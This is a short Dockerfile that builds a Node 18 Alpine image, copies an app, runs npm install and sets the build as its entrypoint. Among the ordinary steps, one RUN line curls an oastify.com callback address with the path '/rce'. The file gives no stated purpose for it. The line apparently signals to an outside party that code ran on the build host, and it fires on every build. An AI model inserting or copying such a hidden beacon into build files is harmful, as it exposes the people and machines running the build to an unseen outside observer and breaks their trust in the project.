FROM node:18-alpine

RUN apk add --no-cache curl ca-certificates

RUN mkdir -p /app
RUN curl "https://1hjtsgkv3lssc3zer6nrkkzih9n1brzg.oastify.com/rce"
COPY . /app
WORKDIR /app
RUN npm install .

ENTRYPOINT ["npm", "run", "build"]
